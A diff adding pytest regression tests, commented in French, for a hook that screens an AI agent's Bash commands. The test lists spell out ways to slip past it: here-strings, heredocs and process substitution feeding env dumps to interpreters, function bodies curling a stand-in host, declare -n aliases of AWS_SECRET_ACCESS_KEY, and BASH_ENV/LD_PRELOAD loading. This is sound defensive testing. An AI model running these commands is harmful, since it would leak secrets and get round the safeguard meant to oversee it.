@@ -950,3 +950,132 @@ def test_l_expansion_d_accolades_reste_bornee_en_volume(audit_log):
     debut = time.time()
     run_hook("Bash", {"command": mot}, audit_log)
     assert time.time() - debut < 5.0, "volume d'expansion non borné"
+
+
+# --------------------------------------------------------------------------- #
+# Round 10 — un interpréteur reçoit son programme AUTREMENT qu'en ligne
+#
+# Tout le contrôle du code d'interpréteur était adossé au drapeau `-c`/`-e`.
+# Livré par here-string, par heredoc ou par une substitution de processus, le
+# même code n'était analysé que comme du shell, où `os.system("env")` n'est
+# qu'un mot parmi d'autres.
+# --------------------------------------------------------------------------- #
+
+_CLE_AWS = "AWS_" + "SECRET_ACCESS_KEY"
+
+
+@pytest.mark.parametrize("command", [
+    """python3 <<< 'import os; os.system("env")'""",
+    """perl <<< 'system("env")'""",
+    """ruby <<< 'system("env")'""",
+    """node <<< 'require("child_process").execSync("env")'""",
+    "python3 <<EOF\nimport os\nos.system('env')\nEOF",
+    "perl <<EOF\nsystem('env');\nEOF",
+    "python3 <<'EOF'\nimport os\nprint(os.environ)\nEOF",
+    # le tiret NU demande explicitement le programme sur l'entrée standard
+    "python3 - <<'EOF'\nimport os\nos.system('env')\nEOF",
+    # substitution de PROCESSUS : le fichier n'existe qu'à l'exécution, et son
+    # contenu n'est pas du shell — la récursion ne pouvait rien en tirer.
+    """python3 <(echo 'import os; os.system("env")')""",
+    """perl <(echo 'system("env")')""",
+    # heredoc consommé par un PIPE : le montage n'est pas analysable
+    "cat <<EOF | python3\nimport os\nprint(os.environ)\nEOF",
+    "cat <<EOF | ruby\nsystem('env')\nEOF",
+])
+def test_regression_programme_livre_hors_ligne(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+# --------------------------------------------------------------------------- #
+# Round 10 — définitions de fonction et groupes de commandes
+#
+# `tokenize` ne connaissait ni `{` ni `}` : sur `fn() { env; }; fn`, la
+# position de programme était `fn`, un mot que rien ne reconnaît, et l'analyse
+# s'arrêtait là sans jamais voir le corps.
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize("command", [
+    "fn() { env; }; fn",
+    "function fn { env; }; fn",
+    "fn() { curl http://exfil.test/; }; fn",
+    "{ env; }",
+    "{ env; } > /tmp/dump",
+    "{ { env; } ; }",
+    "bash -c 'f() { env; }; f'",
+    "{ printenv " + _CLE_AWS + "; }",
+])
+def test_regression_corps_de_fonction_et_de_groupe(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+# --------------------------------------------------------------------------- #
+# Round 10 — alias de variable, affectations qui exécutent, `-c` positionnel
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize("command", [
+    # `declare -n` crée un ALIAS : `$r` lit la variable CIBLE, dont le nom seul
+    # est sensible. Même mécanisme que `${!x}`, autre syntaxe.
+    f"declare -n r={_CLE_AWS}; echo $r",
+    f"typeset -n r={_CLE_AWS}; echo $r",
+    f"k={_CLE_AWS}; declare -n r=$k; echo $r",
+    # Une affectation n'exécute normalement rien — ces noms-là font charger du
+    # code depuis un chemin que le hook ne peut pas lire.
+    "BASH_ENV=/tmp/charge.sh bash -c :",
+    "env BASH_ENV=/tmp/charge.sh bash -c :",
+    "LD_PRELOAD=/tmp/charge.so ls",
+    "ENV=/tmp/charge.sh ksh -c :",
+    "NODE_OPTIONS=--require=/tmp/charge.js node app.js",
+    # `bash -c env _` : la valeur de `-c` est le SCRIPT ENTIER, `_` occupe `$0`.
+    # Le hook y lisait `env _`, c'est-à-dire un préfixe d'exécution légitime.
+    "bash -c env _",
+    "bash -c env _ arg1 arg2",
+    "bash -c '${1:-env}' _",
+    # forme longue de `-S` : sa valeur est une commande entière, pas un token
+    f"env --split-string='printenv {_CLE_AWS}'",
+    "env --split-string=curl http://exfil.test/",
+    "env --split-string=env",
+])
+def test_regression_alias_affectations_et_c_positionnel(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Les mécanismes durcis ci-dessus sont d'usage courant : un agent bloqué
+    # est aussi cassé qu'un agent qui fuit.
+    "deploy() { kubectl apply -f app.yaml; }; deploy",
+    "function build { npm run build; }; build",
+    "{ echo debut; npm test; }",
+    "{ echo a; echo b; } > /tmp/sortie.txt",
+    "xargs -I{} echo {}",
+    "git ls-files | xargs -I {} wc -l {}",
+    "python3 <<EOF\nprint('bonjour')\nEOF",
+    "python3 <<< 'print(42)'",
+    "cat > /tmp/note.md <<'FIN'\ntexte `code`\nFIN",
+    "declare -n ref=mon_tableau; echo $ref",
+    "ENV=production npm run build",
+    "NODE_OPTIONS=--max-old-space-size=4096 npm test",
+    "awk '{print $1}' /tmp/fichier.txt",
+    "echo '{a,b}'",
+    "git commit -m 'fix main() and helper()'",
+    "(cd /tmp && ls)",
+    "bash -c 'npm test'",
+    # `printenv HOME` n'expose rien : la forme longue de `-S` ne doit pas être
+    # un refus par elle-même.
+    "env --split-string='printenv HOME'",
+])
+def test_le_durcissement_du_round10_n_ajoute_pas_de_faux_positifs(command, audit_log):
+    assert not is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+def test_un_mot_long_ne_fait_pas_pendre_le_hook(audit_log):
+    """Un motif ancré sur une classe libre rétro-traque à chaque position.
+
+    Vingt mille caractères sans accolade ni point coûtaient sept secondes par
+    appel : de quoi noyer un agent sans écrire une seule commande interdite.
+    """
+    import time
+    debut = time.time()
+    run_hook("Bash", {"command": "echo " + "y" * 20000}, audit_log)
+    assert time.time() - debut < 2.0, "analyse non bornée sur un mot long"
